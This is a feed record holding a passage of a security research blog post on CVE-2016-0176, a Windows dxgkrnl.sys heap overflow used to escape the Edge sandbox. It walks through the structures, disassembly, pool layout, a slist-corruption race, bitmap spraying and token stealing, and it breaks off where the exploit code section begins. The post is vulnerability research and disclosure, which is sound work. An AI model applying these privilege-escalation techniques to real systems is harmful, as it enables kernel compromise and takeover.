{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-17 01:21:10","updatedTime":"2020-10-17 01:21:10","title":"A Link to System Privilege","link":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","description":"<h2 id=\"A-Detailed-Description-of-CVE-2016-0176-and-Its-Exploitation\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#A-Detailed-Description-of-CVE-2016-0176-and-Its-Exploitation\" class=\"headerlink\" title=\"A Detailed Description of CVE-2016-0176 and Its Exploitation\"></a>A Detailed Description of CVE-2016-0176 and Its Exploitation</h2> \n<h3 id=\"Essentials-of-a-Successful-Pwn-of-Microsoft-Edge\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Essentials-of-a-Successful-Pwn-of-Microsoft-Edge\" class=\"headerlink\" title=\"Essentials of a Successful Pwn of Microsoft Edge\"></a>Essentials of a Successful Pwn of Microsoft Edge</h3> \n<p>A successful Pwn of Microsoft Edge consists of two essential parts: Browser RCE(Remote Code Execution) and browser sandbox bypass. Browser RCE is typically achieved by exploiting a Javascript vulnerability, while browser sandbox bypass can be achieved in different ways, logical sandbox escape or EoP(Escalation of Privilege) through kernel vulnerabilities.</p> \n<p>Sandbox of Microsoft Edge is built upon the access check mechanism. In Windows operating system, resources are shared in system-wide range, for example, a file or device can be shared across different processes. Some resources contain sensitive informations, some others are critical to the whole system’s well-functioning, corruptions of those resources will crash the whole system. For those reasons, there should be strict checks when a process want to access a specific resource, this is called access check. When a resource is opened, token of the subject process will be checked against security descriptor of the object resource. Access check consists of several elementary checks in different dimensions, such as ownership and group membership check, privileges check, integrity level and trust level check, capabilities check, etc. The previous generation sandbox is based on integrity level check, where the sandboxed application runs in low integrity level, thus it can not access resources protected by medium or higher integrity level. Microsoft Edge adopts new generation sandbox based on AppContainer, where additional capabilities check will be conducted when accessing resources, besides basic integrity level check. For more details about access check mechanism, refer to my talk at ZeroNights 2015: <a href=\"https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf\" target=\"_blank\" rel=\"noopener\">Did You Get Your Token?</a><br><a id=\"more\"></a><br>The most common approach of a sandbox bypass is EoP though kernel vulnerabilities, with DKOM(Direct Kernel Object Manipulation) on token objects.</br></br></p> \n<h3 id=\"CVE-2016-0176\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176\" class=\"headerlink\" title=\"CVE-2016-0176\"></a>CVE-2016-0176</h3> \n<p>This vulnerability is in dxgkrnl.sys driver, and it is a heap overflow vulnerability. </p> \n<p>The data structure that has been abused is shown as below:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">D3DKMT_PRESENTHISTORYTOKEN</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\">    D3DKMT_PRESENT_MODEL  Model; <span class=\"comment\">//D3DKMT_PM_REDIRECTED_FLIP      = 2,</span></span><br><span class=\"line\">    UINT                  TokenSize; <span class=\"comment\">// 0x438</span></span><br><span class=\"line\">    UINT64                CompositionBindingId;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">union</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN Flip;</span><br><span class=\"line\"> D3DKMT_BLTMODEL_PRESENTHISTORYTOKEN Blt;</span><br><span class=\"line\"> D3DKMT_VISTABLTMODEL_PRESENTHISTORYTOKEN VistaBlt;</span><br><span class=\"line\"> D3DKMT_GDIMODEL_PRESENTHISTORYTOKEN Gdi;</span><br><span class=\"line\"> D3DKMT_FENCE_PRESENTHISTORYTOKEN Fence;</span><br><span class=\"line\"> D3DKMT_GDIMODEL_SYSMEM_PRESENTHISTORYTOKEN GdiSysMem;</span><br><span class=\"line\"> D3DKMT_COMPOSITION_PRESENTHISTORYTOKEN Composition;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> Token;</span><br><span class=\"line\">} D3DKMT_PRESENTHISTORYTOKEN;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>I will use “history token” as alias of this structure, there are some prerequisites for this vulnerability in this structure: </p> \n<ul> \n <li><strong>Model</strong> member should be set to <strong>D3DKMT_PM_REDIRECTED_FLIP</strong>;</li> \n <li><strong>TokenSize</strong> member should be set to <strong>0x438</strong>; </li> \n</ul> \n<p>You may already guessed that the vulnerability is in the <strong>Token.Flip</strong> member, whose type is shown as below:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br /></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\">    UINT64                                     FenceValue;</span><br><span class=\"line\">    ULONG64                                    hLogicalSurface;</span><br><span class=\"line\">    UINT_PTR                                   dxgContext;</span><br><span class=\"line\"> D3DDDI_VIDEO_PRESENT_SOURCE_ID VidPnSourceId;</span><br><span class=\"line\"></span><br><span class=\"line\"> ……</span><br><span class=\"line\"> </span><br><span class=\"line\"> D3DKMT_DIRTYREGIONS DirtyRegions;</span><br><span class=\"line\">} D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN;</span><br /></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>Keep diving into the last member <strong>DirtyRegions</strong>:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagRECT</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\">    LONG    left;</span><br><span class=\"line\">    LONG    top;</span><br><span class=\"line\">    LONG    right;</span><br><span class=\"line\"> LONG bottom;</span><br><span class=\"line\">} RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT; <span class=\"comment\">// 0x10 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">D3DKMT_DIRTYREGIONS</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\"> UINT NumRects;</span><br><span class=\"line\"></span><br><span class=\"line\"> RECT Rects[D3DKMT_MAX_PRESENT_HISTORY_RECTS]; <span class=\"comment\">// 0x10 * 0x10 = 0x100 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//#define D3DKMT_MAX_PRESENT_HISTORY_RECTS 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">} D3DKMT_DIRTYREGIONS;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>Now we reach to the primitive level, there is a DWORD member <strong>NumRects</strong>, and an array of <strong>RECT</strong> structures as <strong>Rects</strong>, this array is fixed-sized to 16 elements, each element is 0x10 bytes, so the size of <strong>Rects</strong> is 0x100 bytes.</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_1.svg\" alt=\"Layout of Abused structures\" /></p> \n<p>This graph above shows the relationship and layout of abused data structures, the left column is the data structure that we prepared in user-mode and passed to kernel-mode drivers by calling Win32 API <strong>D3DKMTPresent</strong>, the middle column is the data structure that dxgkrnl.sys driver received and maintained, it is copied out from the user-mode buffer, the right column is the embedded union member <strong>Token.Flip</strong>, a very important feature of this union member is that it is the largest member in the union, we know that the size of a union is determined by its largest member, so the content of <strong>Token.Flip</strong> stretches to the end of the history token structure. This layout simplifies the exploitation to a large extent.</p> \n<p>With the knowledge of the abused data structures, it will be easy to understand the vulnerability, below is the disassembly code snippet that cause the overflow:</p> \n<pre><code>loc_1C009832A: DXGCONTEXT::SubmitPresentHistoryToken(......) + 0x67B        cmp     dword ptr[r15 + 334h], 10h // NumRects        jbe     short loc_1C009834B; Jump if Below or Equal(CF = 1 | ZF = 1)        call    cs : __imp_WdLogNewEntry5_WdAssertion        mov     rcx, rax        mov     qword ptr[rax + 18h], 38h        call    cs : __imp_WdLogEvent5_WdAssertionloc_1C009834B: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6B2        mov     eax, [r15 + 334h]        shl     eax, 4        add     eax, 338h        jmp     short loc_1C00983BDloc_1C00983BD: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6A5        lea     r8d, [rax + 7]        mov     rdx, r15; Src        mov     eax, 0FFFFFFF8h;        mov     rcx, rsi; Dst        and     r8, rax; Size        call    memmove</code></pre> \n<p>The r15 register is pointing to the buffer of history token at the entry of this piece of code. It first picks out the DWORD at 0x334 offset and compare it with 0x10, we already know that this DWORD is the <strong>Token.Flip.NumRects</strong> field, so it is checking if this field exceeds the capacity of the embedded array <strong>Token.Flip.Rects</strong>. If you are doing code auditing, and you see this check, you may feel frustrated and soliloquize that Microsoft already realized the potential problem here and done some check. But when you move forward, you will see after this check the code logs this abnormal behavior to the watch dog driver with assertion logic, and either branches initiated from this comparison will flow into the same code block at loc_1C009834B. Then you may think that the watch dog driver will invoke the bug check logic in case of overflow, but nothing happened actually. No matter what the value is in <strong>Token.Flip.NumRects</strong> field, the code flow will reach the block at loc_1C009834B, this block first does some arithmatic calculation based on the <strong>Token.Flip.NumRects</strong> field and then use it as the size of a memcpy operation. </p> \n<p>I rewrite this piece of disassembly code to C++ code as below:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">D3DKMT_PRESENTHISTORYTOKEN* hist_token_src = BufferPassedFromUserMode(…);</span><br><span class=\"line\">D3DKMT_PRESENTHISTORYTOKEN* hist_token_dst = ExpInterlockedPopEntrySList(…);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(hist_token_src-&gt;dirty_regions.NumRects &gt; <span class=\"number\">0x10</span>)</span><br><span class=\"line\">{</span><br><span class=\"line\"> <span class=\"comment\">// log via watch dog assertion, NOT work in free/release build</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">auto</span> size = (hist_token_src-&gt;dirty_regions.NumRects * <span class=\"number\">0x10</span> + <span class=\"number\">0x338</span> + <span class=\"number\">7</span>) / <span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"keyword\">auto</span> src = (<span class=\"keyword\">uint8_t</span>*)hist_token_src;</span><br><span class=\"line\"><span class=\"keyword\">auto</span> dst = (<span class=\"keyword\">uint8_t</span>*)hist_token_dst;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(dst, src, size);</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p> Things become clear in C++ codes, no matter what the <strong>Token.Flip.NumRects</strong> is, dxgkrnl.sys driver will do a memcpy operation, the source buffer of this memcpy is the buffer we passed from user-mode by calling Win32 API <strong>D3DKMTPresent</strong> function, the destination of this memcpy is a piece of buffer allocated from kernel-mode pool by <strong>ExpInterlockedPopEntrySList</strong>, the size of this memcpy is calculated by adding the array size of <strong>Token.Flip.NumRects</strong> elements with the buffer size before this array. If we pass a value larger than 0x10 in <strong>Token.Flip.NumRects</strong> field in the user-mode buffer, then an overflow to kernel-mode paged pool will occur, we can control the size of the overflow, as well as the first 0x38 bytes content of this overflow. (0x38 more bytes can be set after the end of history token, check the layout graph for more details.)</p> \n<p> This vulnerability is interesting, because Microsoft already foresee it but fail to prevent it. The lesson is do not fully trust some best practices unless you know it very well, such as assertion mechanism.</p> \n<h3 id=\"Exploitation\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Exploitation\" class=\"headerlink\" title=\"Exploitation\"></a>Exploitation</h3> \n<p> For exploitation of a heap overflow, the layout of the destination buffer is very important. We already know that the destination buffer is allocated from kernel-mode paged pool with <strong>ExpInterlockedPopEntrySList</strong> function. </p> \n<p> With a little debugging work, we can get some basic information about the destination buffer. </p> \n<pre><code>kd&gt; u rip-6 L2dxgkrnl!DXGCONTEXT::SubmitPresentHistoryToken+0x47b:fffff801`cedb80fb call    qword ptr [dxgkrnl!_imp_ExpInterlockedPopEntrySList (fffff801`ced77338)]fffff801`cedb8101 test    rax,raxkd&gt; !pool raxPool page ffffc0012764c5a0 region is Paged pool*ffffc0012764b000 : large page allocation, tag is DxgK, size is 0x2290 bytes    Pooltag DxgK : Vista display driver support, Binary : dxgkrnl.sys</code></pre> \n<p>It is a large buffer in 0x2290 bytes, as its size is larger than 1 page(a page is 0x1000 bytes), it will be allocated as large page allocation. In this case, 3 continuous pages will be consumed to serve this allocation request. The extra bytes after 0x2290 offset will be reclaimed and linked back to free list of paged pool, while an extra separating pool entry tagged as “Frag” will be added between them. For more information about Windows kernel pool layout and large page allocation, please refer to <a href=\"https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf\" target=\"_blank\" rel=\"noopener\">Kernel Pool Exploitation on Windows 7</a>. Below is how it looks at the 0x2290 offset:</p> \n<pre><code>kd&gt; db ffffc0012764b000+0x2290 L40ffffc001`2764d290  00 01 02 03 46 72 61 67-00 00 00 00 00 00 00 00  ....Frag........ffffc001`2764d2a0  90 22 00 00 00 00 00 00-00 00 00 00 00 00 00 00  .\"..............ffffc001`2764d2b0  02 01 01 00 46 72 65 65-0b 43 44 9e f1 81 a8 47  ....Free.CD....Gffffc001`2764d2c0  01 01 04 03 4e 74 46 73-c0 32 42 3a 00 e0 ff ff  ....NtFs.2B:....</code></pre> \n<p>It is <strong>DXGPRESENTHISTORYTOKENQUEUE::GrowPresentHistoryBuffer</strong> who is responsible for allocating and managing history tokens as a singly-linked list. Each history token is 0x438 bytes in size, and extend to 0x450 bytes by counting pool header and padding bytes in; The large page allocation is divided into 8 history tokens, linked in reverse order to form the singly-linked list. Dxgkrnl.sys driver intends to use this slist as look-aside list for serving the allocation requests of history token.</p> \n<p>This singly-linked list looks as below initially:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_2.svg\" alt=\"Singly-Linked List of History Tokens\" /></p> \n<p>The singly-linked list looks as below after serving 1 history token allocation request:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_3.svg\" alt=\"Singly-Linked List After 1 Pop\" /></p> \n<p>The singly-linked list looks as below after serving 2 history token allocation request:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_4.svg\" alt=\"Singly-Linked List After 2 Pop\" /></p> \n<p>With knowledge of the memory layout of destination buffer of the heap overflow, we have 2 ideas about exploitation:</p> \n<h4 id=\"Idea-1-Overflow-the-buffer-after-0x2290-offset-where-maybe-reused-by-some-small-allocations-from-paged-pool\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Idea-1-Overflow-the-buffer-after-0x2290-offset-where-maybe-reused-by-some-small-allocations-from-paged-pool\" class=\"headerlink\" title=\"Idea 1. Overflow the buffer after 0x2290 offset, where maybe reused by some small allocations from paged pool:\"></a>Idea 1. Overflow the buffer after 0x2290 offset, where maybe reused by some small allocations from paged pool:</h4> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_5.svg\" alt=\"Overflow Scenario 1\" /></p> \n<h4 id=\"Idea-2-Overflow-the-adjacent-history-token’s-header-which-may-abuse-the-singly-linked-list\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Idea-2-Overflow-the-adjacent-history-token’s-header-which-may-abuse-the-singly-linked-list\" class=\"headerlink\" title=\"Idea 2. Overflow the adjacent history token’s header, which may abuse the singly-linked list:\"></a>Idea 2. Overflow the adjacent history token’s header, which may abuse the singly-linked list:</h4> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_6.svg\" alt=\"Overflow Scenario 2\" /></p> \n<p>The first exploitation idea has some limitations, recall that we can control only 0x38 bytes of the overflowed content, it means we can almost control nothing but the padding bytes, separating frag pool entry and the following pool entry’s header. </p> \n<p>The second exploitation idea seems promising, although now Windows kernel is enforcing strict validation for doubly-linked list, but no checks for singly-linked list, we can play the redirecting tricks for singly-linked list.</p> \n<p>Let’s do some thought experiments just like Einstein for idea 2. In the above graphs, we see that after poping 2 history tokens out of the slist, we can overflow node B and overwriting the header of node A. Then we push node B back to the slist:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_7.svg\" alt=\"Overwriting Node A's header\" /></p> \n<p>What happens after we push node A back to the slist, will it redirect next pointer to the overwritten QWORD?</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_9.svg\" alt=\"Redirect Impossible\" /></p> \n<p>Actually this will never happen, because while we pushing node A back to slist, the overwritten QWORD in node A’s header will be recovered to pointing to node B:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_10.svg\" alt=\"Back to Initial State\" /></p> \n<p>Then we try another possibility, first get back to where after poping 2 nodes out of slist:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_11.svg\" alt=\"After Poping 2 Nodes\" /></p> \n<p>This time we first push node A back to slist:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_12.svg\" alt=\"First Push Node A Back\" /></p> \n<p>Then we overflow node B to overwrite node A’s header, because now node A already be reclaimed to slist, and its header will not be recovered any more. Now the slist is broken and redirected to the overwritten QWORD:</p> \n<p><img src=\"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_13.svg\" alt=\"Overflow Scenario 3\" /></p> \n<p>After this series of thought experiments, it is more promising for exploitation in idea 2, let’s get our hands dirty. It seems that we need to pop and push the slist in random order to trigger the above redirection, at least 2 continuous pops side by side. I did the following tries:</p> \n<h4 id=\"1st-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#1st-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer\" class=\"headerlink\" title=\"1st Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer.\"></a>1st Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer.</h4> \n<p>This time I failed, it turns out looping poping node A out and pushing node A back again, in this case I can only overflow as idea 1. The reason is simple, those D3DKMTPresent API calls are served in turns, so we need to call it simultaneously.</p> \n<h4 id=\"2nd-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#2nd-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads\" class=\"headerlink\" title=\"2nd Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer from multiple threads.\"></a>2nd Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer from multiple threads.</h4> \n<p>This time I failed again, after checking some disassembly codes, I believe<br>the callstack of D3DKMTPresent is protected by a lock.</br></p> \n<p>After those 2 tries, I start to doubt if the 2 continuous pops are doable, I abandoned this doubt quickly after realizing the complex slist should not be degenerated to 1 element, there should be other callstacks triggering pop of the slist. I wrote a windbg script for logging push and pop operations, and tried launching some graphics intensive applications while doing 2nd try. Then miracle happened, while I playing with the built-in Solitaire games, a double pop happened, I debugged and found out a BitBlt API will trigger poping elements out of the slist from another callstack. </p> \n<h4 id=\"3rd-and-Last-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads-while-loop-calling-BitBlt-from-another-multiple-threads\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#3rd-and-Last-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads-while-loop-calling-BitBlt-from-another-multiple-threads\" class=\"headerlink\" title=\"3rd and Last Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer from multiple threads, while loop calling BitBlt from another multiple threads.\"></a>3rd and Last Try: Loop calling D3DKMTPresent with overflowing fields set in the buffer from multiple threads, while loop calling BitBlt from another multiple threads.</h4> \n<p>It succeeded in redirecting the next pointer in slist, and lead to arbitrary write to kernel-mode memory. But it is still far from perfect, we need to find out the tokens of current and system process, and do token stealing. During this process, more than 1 reads and writes are needed, but the tricks above is not easily repeatable, especially with the strict rules of Pwn2Own 2016 that only 3 tries within 15 minutes, some more tricks is needed.</p> \n<h3 id=\"Some-More-Tricks\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Some-More-Tricks\" class=\"headerlink\" title=\"Some More Tricks\"></a>Some More Tricks</h3> \n<h4 id=\"Repeatable-arbitrary-read-and-write-into-kernel-mode-memory\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Repeatable-arbitrary-read-and-write-into-kernel-mode-memory\" class=\"headerlink\" title=\"Repeatable arbitrary read and write into kernel-mode memory\"></a>Repeatable arbitrary read and write into kernel-mode memory</h4> \n<p>I used Win32k bitmap object as intermediate targets, I did it by first spraying lots of bitmap objects into kernel-mode memory, and then guessing their addresses as targets of the redirection write. If I succeeded in hitting one of those bitmap objects, I modify the buffer pointer and size field in it, make it pointing to another bitmap object. So 2 bitmap objects in use, first for controlling the address of read and write, second for doing actual read and write.</p> \n<p>Actually I sprayed bitmap objects into 4GB range of memory, I first sprayed 256MB large bitmap objects to reserve continuous and well-aligned pool memory, then I replace them with 1MB small bitmap objects whose address is aligned at 0x100000 boundary, which makes guessing much easier.</p> \n<p>Information leakage is needed as a hint for guessing the addresses of sprayed bitmap objects, this is done with the help of <strong>user32! gSharedInfo</strong>.</p> \n<h4 id=\"Token-Stealing\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Token-Stealing\" class=\"headerlink\" title=\"Token Stealing\"></a>Token Stealing</h4> \n<p>With the ability of repeatably arbitrary read and write, as well as information leakage of nt kernel module base address by sidt, we can easily find the address of <strong>nt!PspCidTable</strong>, then we can find the _EPROCESS object of current and system process by parsing this table, and get the respective _TOKEN object addresses and finally do the token stealing.</p> \n<h3 id=\"Exploitation-Code-parts\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Exploitation-Code-parts\" class=\"headerlink\" title=\"Exploitation Code(parts)\"></a>Exploitation Code(parts)</h3> \n<figure class=\"highlight c\"> \n <table> \n  <tr> \n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br 